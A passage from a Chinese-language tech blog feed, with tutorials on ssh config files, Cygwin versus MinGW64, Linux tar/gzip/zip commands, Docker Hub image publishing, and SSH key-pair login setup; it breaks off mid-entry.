    <content type="html"><![CDATA[<p>很早就接触到了SSH，起初并不知道有<code>ssh config</code>这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。</p><p>最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。</p><a id="more"></a><h2 id="什么是SSH-Config"><a href="#什么是SSH-Config" class="headerlink" title="什么是SSH Config"></a>什么是SSH Config</h2><blockquote><p>先决条件：在使用ssh 之前，需要先安装好<code>Openssh</code>、<code>SSH1</code>或者是<code>SSH2</code>。（Linux、Mac用户请忽略）</p></blockquote><p><code>~/.ssh/config</code> 是通过ssh 连接远程服务器时使用的配置文件。</p><h2 id="为什么要使用SSH-Config"><a href="#为什么要使用SSH-Config" class="headerlink" title="为什么要使用SSH Config"></a>为什么要使用SSH Config</h2><p>例如：使用SSH 进行远程连接，一般会这样做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh Boo@18.182.201.142</span><br></pre></td></tr></table></figure><p>在简单地连接情况下，它并不麻烦。但是当端口号不是默认值（22）时，当密钥对不是默认名称时，连接就变得复杂了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定端口连接</span><br><span class="line">$ ssh Boo@18.182.201.142 -p 2222</span><br><span class="line"></span><br><span class="line"># 非默认名称密钥认证</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142</span><br><span class="line"></span><br><span class="line"># 以上两种情况综合</span><br><span class="line">$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222</span><br></pre></td></tr></table></figure><p>此时，使用<code>ssh config</code>就变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.ssh&#x2F;config</span><br><span class="line">Host aliyun</span><br><span class="line">    HostName 18.182.201.142</span><br><span class="line">    Port 2222</span><br><span class="line">    User Boo</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun</span><br></pre></td></tr></table></figure><p>现在在连接使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh aliyun</span><br></pre></td></tr></table></figure><p>是不是非常的方便！就算此时手上有多台服务器需要管理，只要配置好对应的<code>~/.ssh/config</code>参数，就可以很轻松的进行连接了。</p><p>但需要注意的是：有关ssh 的配置不能分成多个文件，只能写在这一个文件中<code>~/.ssh/config</code>（如果你有更好的办法）。</p><p>SSH 的配置文件同样适用于其他程序，如：<code>scp</code>，<code>sftp</code>等。</p><h2 id="常用的配置选项"><a href="#常用的配置选项" class="headerlink" title="常用的配置选项"></a>常用的配置选项</h2><h3 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h3><ul><li>空行和以’＃’开头的行是注释。</li><li>每行以关键字开头，后跟参数。</li><li>配置选项可以用空格或可选的空格分隔，只需要一个=。</li><li>参数可以用双引号（”）括起来，以指定包含空格的参数。</li></ul><h3 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h3><p>SSH Config 的关键字不区分大小写，但是参数区分大小写。</p><ul><li><input checked="" disabled="" type="checkbox"> Host：可以理解为远程主机名的别名，最终指明这个名称进行连接，如：<code>ssh aliyun</code></li><li><input checked="" disabled="" type="checkbox"> HostName：需要远程连接的主机名，通常都是IP。</li><li><input checked="" disabled="" type="checkbox"> Port：指定连接端口</li><li><input checked="" disabled="" type="checkbox"> User：指定连接用户</li><li><input checked="" disabled="" type="checkbox"> IdentityFile：指明远程连接密钥文件</li></ul><blockquote><p>注：Host 关键字可以包含以下模式匹配：</p></blockquote><ul><li><code>*</code>- 匹配零个或多个字符。例如，Host <em>将匹配所有主机，同时`192.168.0.</em><code>匹配</code>192.168.0.0/24`子网中的所有主机。</li><li>? - 恰好匹配一个字符。该模式Host <code>10.10.0.?</code>将匹配<code>10.10.0.[0-9]</code>范围内的所有主机。</li><li>!- 在模式的开头将否定其匹配例如，Host <code>10.10.0.*</code> <code>!10.10.0.5</code>将匹配<code>10.10.0.0/24</code>子网中的任何主机，除了<code>10.10.0.5</code>。</li></ul><h4 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h4><ul><li><p>全局配置文件：<code>/etc/ssh/ssh_config</code></p></li><li><p>用户配置文件：<code>~/.ssh/config</code></p></li></ul><p>ssh 客户端按以下优先顺序读取其配置：</p><ol><li>从命令行指定的选项</li><li>用户的ssh 配置文件</li><li>全局的ssh 配置文件</li></ol><p>如果希望SSH 客户端忽略ssh 配置文件中指定的所有选项，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -F user@example.com</span><br></pre></td></tr></table></figure><h2 id="恢复连接"><a href="#恢复连接" class="headerlink" title="恢复连接"></a>恢复连接</h2><p>常用SSH 的小伙伴可能都知道，使用SSH 连接到远程服务器之后，如果一段时间没有输入任何指令，很有可能会断开与服务器的连接，需要重连就会变得很麻烦。</p><p>此时，ssh config 又变得很有用了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＃定期向服务器发送实时报告（每60秒，可以自定义）</span><br><span class="line">ServerAliveInterval 60</span><br><span class="line"></span><br><span class="line"># 如果想要针对某个连接单独使用，需要放在Host 指令下，全局则放在最头部</span><br><span class="line">Host aliyun</span><br><span class="line">    ServerAliveInterval 60</span><br></pre></td></tr></table></figure><h3 id="可能感兴趣的内容"><a href="#可能感兴趣的内容" class="headerlink" title="可能感兴趣的内容"></a>可能感兴趣的内容</h3><ul><li><a href="https://linuxize.com/post/how-to-change-ssh-port-in-linux/" target="_blank" rel="noopener">如何在Linux 中更改SSH 端口</a></li><li><a href="https://qiita.com/passol78/items/2ad123e39efeb1a5286b#sshconfig%E3%81%A8%E3%81%AF" target="_blank" rel="noopener">关于 ~/.ssh/config</a></li><li><a href="https://linuxize.com/post/using-the-ssh-config-file/" target="_blank" rel="noopener">使用 SSH 配置文件</a></li><li><a href="https://man.openbsd.org/OpenBSD-current/man5/ssh_config.5" target="_blank" rel="noopener">ssh_config 指令详解</a></li><li><a href="https://www.ssh.com/" target="_blank" rel="noopener">SSH 官网</a></li><li><a href="https://www.ssh.com/ssh/config/" target="_blank" rel="noopener">OpenSSH 客户端SSH 配置文件</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;很早就接触到了SSH，起初并不知道有&lt;code&gt;ssh config&lt;/code&gt;这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。&lt;/p&gt;
&lt;p&gt;最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Cygwin 快速上手</title>
    <link href="https://www.0x2beace.com/cygwin-quick-start/"/>
    <id>https://www.0x2beace.com/cygwin-quick-start/</id>
    <published>2020-09-01T14:16:25.000Z</published>
    <updated>2020-09-03T15:47:42.934Z</updated>
    
    <content type="html"><![CDATA[<p>在很早之前就听说过<code>Cygwin</code>和<code>MinGW64</code>这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和<code>msysGit</code> 搞混淆，加上最近用<code>MinGW64</code>用的很不顺手，所以打算安装一个<code>Cygwin</code>。</p><a id="more"></a><h2 id="区别与联系"><a href="#区别与联系" class="headerlink" title="区别与联系"></a>区别与联系</h2><p>首先来介绍下这三者分别是什么。</p><h3 id="Cygwin"><a href="#Cygwin" class="headerlink" title="Cygwin"></a>Cygwin</h3><p>Cygwin是一个类似Unix的环境和Microsoft Windows命令行界面。</p><p>大量GNU和开源工具，提供类似于 Windows上的 Linux发行版的功能。用官网的话说就是：在Windows 上获取Linux 的感觉。</p><h3 id="MinGW64"><a href="#MinGW64" class="headerlink" title="MinGW64"></a>MinGW64</h3><p>MSYS(MSYS | MinGW) 是一个在 Windows 下的类<code>Unit</code>工作环境。因为 Git 里面包含很多 Shell 跟 Perl 脚本，所以它(Git)需要一个这样的环境。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221056.png" alt=""></p><p>每次右键打开<code>Git Bash</code>时，其终端就是<code>MinGW64</code></p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221113.png" alt=""></p><h3 id="msysGit"><a href="#msysGit" class="headerlink" title="msysGit"></a>msysGit</h3><p>msysGit是一个构建环境，其中包含希望通过为Git for Windows编写代码来贡献所需的所有工具。</p><p>所以，Git for Windows 可以在 Windows 上安装可运行 Git 的最小环境，而 msysGit 是构建 Git for Windows 所需的环境。</p><h2 id="安装Cygwin"><a href="#安装Cygwin" class="headerlink" title="安装Cygwin"></a>安装Cygwin</h2><p>安装Cygwin 的过程比MinGW 要复杂些，其中主要需要注意的是模块部分。</p><p>Cygwin 好用的原因很大程度上是因为其功能之丰富，而各种功能则是来自于其模块。</p><p>终于安装好了，感觉很厉害的样子，是我想要的东西，希望在今后的日子中 能和它好好相处。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221141.png" alt=""></p><p>Mintty是一个终端仿真器 用于Cygwin的， MSYS或 Msys2 和衍生的项目，以及用于WSL。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200901221152.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://mingw-w64.org/doku.php/download/windows" target="_blank" rel="noopener">从Windows 运行下载Cygwin64</a></li><li><a href="https://cygwin.com/index.html" target="_blank" rel="noopener">Cygwin 是什么，不是什么？–官网</a></li><li><a href="https://www.crifan.com/files/doc/docbook/cygwin_intro/release/html/cygwin_intro.html#install_cygwin_setup_exe" target="_blank" rel="noopener">Cygwin 安装教程 详细</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在很早之前就听说过&lt;code&gt;Cygwin&lt;/code&gt;和&lt;code&gt;MinGW64&lt;/code&gt;这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和&lt;code&gt;msysGit&lt;/code&gt; 搞混淆，加上最近用&lt;code&gt;MinGW64&lt;/code&gt;用的很不顺手，所以打算安装一个&lt;code&gt;Cygwin&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="终端" scheme="https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"/>
    
    
    <category term="Cygwin" scheme="https://www.0x2beace.com/tags/Cygwin/"/>
    
    <category term="终端" scheme="https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Linux 压缩、解压、打包详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/</id>
    <published>2020-08-31T15:47:15.000Z</published>
    <updated>2020-09-17T12:51:47.804Z</updated>
    
    <content type="html"><![CDATA[<p>在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。</p><a id="more"></a><p>所以这篇笔记就是用来整理常见的那些解压、压缩、打包的命令。</p><p>在正式学习之前，需要明确的两个概念，打包和压缩不是一回事：</p><ul><li>打包：是指将一大堆文件或目录变成一个总的文件。</li><li>压缩：则是将一个大文件通过压缩算法变成一个小文件。</li></ul><p>为什么要区分这两个概念呢？这源于Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="压缩-打包"><a href="#压缩-打包" class="headerlink" title="压缩/打包"></a>压缩/打包</h3><p>仅打包，不压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf foo.tar foo</span><br></pre></td></tr></table></figure><p><code>foo.tar</code>这个文件名是自定义的，只是习惯上我们使用 <code>.tar</code> 作为包文件。</p><p>打包，且压缩。<code>-z</code>参数表示以 <code>.tar.gz</code> 或者 <code>.tgz</code> 后缀名代表 gzip 压缩过的 tar 包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><p>打包，且压缩。<code>-j</code> 参数表示以 <code>.tar.bz2</code> 后缀名作为tar包名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -jcvf foo.tar.gz foo</span><br></pre></td></tr></table></figure><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>在当前目录下直接解压：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz</span><br></pre></td></tr></table></figure><p>注意，如果这个目录下有同名的文件，不会询问，直接覆盖。</p><p>解压至指定文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf foo.tar.gz -C &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>gzip 命令用来压缩文件。文件经它压缩过后，其名称后面会多处 <code>.gz</code> 扩展名（不带 <code>.tar</code>）。</p><h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录的每个文件压缩成<code>.gz</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip *</span><br></pre></td></tr></table></figure><p>递归压缩指定目录的所有文件及子目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -r &lt;dir name&gt;</span><br></pre></td></tr></table></figure><h3 id="解压-1"><a href="#解压-1" class="headerlink" title="解压"></a>解压</h3><p>解压当前目录下的<code>foo.gz</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d foo.gz</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>foo.gz</code> 就变成了 <code>foo</code> 文件。</p><p>递归解压目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -dr &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>解压完成之后，<code>&lt;dir name&gt;</code> 目录下的所有 <code>.gz</code> 文件都会变成正常文件。</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p><code>zip</code> 可以用来解压缩文件，或者对文件进行打包操作。文件经它压缩后会另外产生具有 <code>.zip</code> 扩展名的压缩文件。</p><h3 id="压缩-1"><a href="#压缩-1" class="headerlink" title="压缩"></a>压缩</h3><p>将当前目录下的指定目录，压缩为 <code>.zip</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &lt;dir name&gt;</span><br></pre></td></tr></table></figure><p>将指定目录下的所有文件及其文件夹，压缩为<code>.zip</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -r foo.zip &#x2F;&lt;path to dir&gt;</span><br></pre></td></tr></table></figure><p>注意，产生的压缩文件在执行命令的那个目录下。</p><h3 id="解压-2"><a href="#解压-2" class="headerlink" title="解压"></a>解压</h3><p>unzip 命令用于解压缩由 zip 命令压缩的 <code>.zip</code>压缩包。</p><p>查看压缩包内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v foo.zip</span><br></pre></td></tr></table></figure><p>将压缩文件在指定目录下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -n foo.zip -d &#x2F;&lt;file to dir&gt;</span><br></pre></td></tr></table></figure><p>将压缩文件在当前目下解压，如果已有相同的文件，不询问，直接覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -o foo.zip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Linux 下的压缩解压其实并不复杂，只是不常用的情况下，很容器忘记。</p><p>如果你不知道在什么场景下，该使用什么命令，可以参照：</p><ul><li>如果只有一个大文件，可以使用 <code>gzip</code> 或者 <code>zip</code>命令。</li><li>如果是一个完整的目录，里面有很多子目录以及文件，可以使用<code>tar</code>命令。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Docker Hub 快速上手</title>
    <link href="https://www.0x2beace.com/docker-hub-quick-start/"/>
    <id>https://www.0x2beace.com/docker-hub-quick-start/</id>
    <published>2020-08-30T10:32:02.000Z</published>
    <updated>2020-08-30T10:35:11.952Z</updated>
    
    <content type="html"><![CDATA[<p>最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而<a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a> 则是托管镜像的地方。</p><a id="more"></a><p>目前大部分需求都可以直接在 Docker Hub 中下载镜像来实现，如果想使用自己仓库中的镜像，那么需要先<a href="https://hub.docker.com/" target="_blank" rel="noopener">注册</a>一个账号。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>想要从 Docker Hub 使用自己的镜像之前，首先得<a href="https://hub.docker.com/repository/create" target="_blank" rel="noopener">创建</a>一个仓库，然后将目标镜镜像 push 到该仓库。</p><p>这个仓库可以是公开的也可以是私有的，这个并不影响你正常使用。</p><p>创建成功之后，就可以看到该仓库了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830180907.png" alt=""></p><h2 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h2><p>在发布之前，确保你本地存在目标镜像，可以使用 <code>docker images</code>来查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>创建 Tag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker tag local-image:tagname new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker tag adminer:latest hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>前面的 <code>tagname</code> 是本地镜像的标签名称，后面的<code>tagname</code> 是该镜像在仓库中的标签名称。</p><p>再次查看本地镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br><span class="line">adminer             latest              c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>发布镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 语法</span><br><span class="line">docker push new-repo:tagname</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">docker push hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>发布成功之后，可以打开 Docker Hub 在 Repositories 的列表中就看到刚才的镜像了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200830181829.png" alt=""></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>首先需要在命令行中登录你的 docker hub 账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker login</span><br></pre></td></tr></table></figure><p>拉取自己的镜像，这里以 <a href="https://hub.docker.com/_/adminer" target="_blank" rel="noopener">adminer</a> 这个镜像为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --link mysql:mysql --name adminer \</span><br><span class="line">-d --restart&#x3D;always \</span><br><span class="line">-p 8006:8080 \</span><br><span class="line">hoooliday&#x2F;runfast:adminer</span><br></pre></td></tr></table></figure><p>唯一需要注意的就是最后一行，如果想要使用官方最新版本的 adminer ，那就直接写成 adminer，但如果想要使用自己的镜像，那就需要写成 <code>username/repo:tagname</code> 的格式。</p><p>查看本地所有镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">hoooliday&#x2F;runfast   adminer             c3588b6003bb        3 weeks ago         90.4MB</span><br></pre></td></tr></table></figure><p>此持就完成了Docker 镜像的发布和拉取了，当然这只是 Docker Hub 所有功能中的冰山一角。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而&lt;a href=&quot;https://hub.docker.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Docker Hub&lt;/a&gt; 则是托管镜像的地方。&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Docker/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Docker" scheme="https://www.0x2beace.com/tags/Docker/"/>
    
    <category term="Docker Hub" scheme="https://www.0x2beace.com/tags/Docker-Hub/"/>
    
  </entry>
  
  <entry>
    <title>Linux 如何生成密钥对进行 ssh 免密登录</title>
    <link href="https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/"/>
    <id>https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/</id>
    <published>2020-08-29T03:46:41.000Z</published>
    <updated>2020-08-29T03:47:53.463Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。</p><a id="more"></a><p>这么做的目的是为了防止服务器密码被暴力破解。</p><blockquote><p>ssh 是什么？</p></blockquote><p>ssh 是一种协议，它可以基于密码进行认证，也可以基于密钥去认证用户。</p><h2 id="生成密钥对"><a href="#生成密钥对" class="headerlink" title="生成密钥对"></a>生成密钥对</h2><p>这里我们使用 <code>RSA</code> 类型的加密类型来创建密钥对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name</span><br></pre></td></tr></table></figure><ol><li><code>-f</code> 参数表示指定密钥对生成位置与名称</li><li>密钥对通常放在 <code>$HOME/.ssh</code> 目录下</li><li>回车即可创建密钥对，如果不需要为密钥对进行加密，那么可以一路回车。</li></ol><p>创建成功之后，可以看到 <code>.ssh</code> 目录下多了两个文件，分别是：</p><ul><li><code>your_key</code>：密钥对的私钥，通常放在客户端。</li><li><code>your_key.pub</code>：密钥对中的公钥，通常放在服务端。</li></ul><h2 id="将本地的公钥传到服务器上"><a href="#将本地的公钥传到服务器上" class="headerlink" title="将本地的公钥传到服务器上"></a>将本地的公钥传到服务器上</h2><p>注意：这里是将<code>your_key.pub</code> 公钥文件上传至你需要连接的服务器，而不是<code>your_key</code>私钥文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport</span><br></pre></td></tr></table></figure><p><code>-i</code> 参数表示使用指定的密钥，<code>-p</code>参数表示指定端口，ssh 的默认端口是 22，如果没有更改默认端口，则可以省略。</p><p>这里需要输入一次密码进行确认，如果成功之后，会看到以下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200829105200.png" alt=""></p><blockquote><p>本地的公钥文件上传在服务器的哪里？</p></blockquote><p>在该用户的<code>.ssh/authorized_keys</code> 文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><h2 id="通过密钥对进行免密登录"><a href="#通过密钥对进行免密登录" class="headerlink" title="通过密钥对进行免密登录"></a>通过密钥对进行免密登录</h2><p>现在我们可以使用以下命令登录到服务器中了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt;</span><br></pre></td></tr></table></figure><p>不出意外，就可以不用输入密码而直接成功登录了。</p><p>如果你仍然需要输入密码或者遇到其他问题了，可以从以下方向进行排查。</p><h3 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h3><ol><li>如果没有使用默认的密钥名称（id_rsa），则在连接主机时需要加上<code>-i</code> 参数，指定对应密钥的名称。否则由于默认私钥与远程主机中的自定义公钥不匹配，自然无法基于密钥进行认证，会再次提示你输入密码。</li><li>服务端的<code>$HOME/.ssh</code>目录的正常权限是700，服务端<code>$HOME/.ssh/authorized_keys</code>文件的权限默认为600。</li><li>上传密钥时使用的是：公钥（.pub），进行密钥认证时使用的是：私钥。</li></ol><h3 id="配置ssh-config"><a href="#配置ssh-config" class="headerlink" title="配置ssh config"></a>配置ssh config</h3><p>上面的命令虽然可以实现免密登录，但是命令太长了，就算是复制粘贴也有可能会出错。</p><p>那有没有什么好的办法，解决这个问题呢？</p><p>当然是有的啦。</p><p>在<code>$HOME/.ssh</code> 目录下，创建一个名为<code>config</code>的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim $HOME&#x2F;.ssh&#x2F;conifg</span><br></pre></td></tr></table></figure><p>加入以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host alias</span><br><span class="line">    User user</span><br><span class="line">    HostName ip address</span><br><span class="line">    Port port</span><br><span class="line">    IdentityFile ~&#x2F;.ssh&#x2F;your_key</span><br><span class="line">    ServerAliveInterval 360</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>Host：可以理解成别名，配置完成之后，最后就通过 <code>ssh alias</code> 进行登录。</li><li>User：远程主机的用户名称</li><li>HostName：远程主机的地址</li><li>Port：端口号</li><li>IdentityFile：私钥文件的路径</li><li>ServerAliveInterval：保持客户端与服务端会话在短时间内不会断开。</li></ul><p>当然，如果你是使用<code>ssh 客户端</code>，那就不用配置这些。</p><h3 id="禁用通过密码认证"><a href="#禁用通过密码认证" class="headerlink" title="禁用通过密码认证"></a>禁用通过密码认证</h3><p>如果上面的配置都无误，可以正常通过密钥进行免密登录，那么最后需要做的一件事情就是关闭服务端的通过密码进行身份认证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line"># 将yes 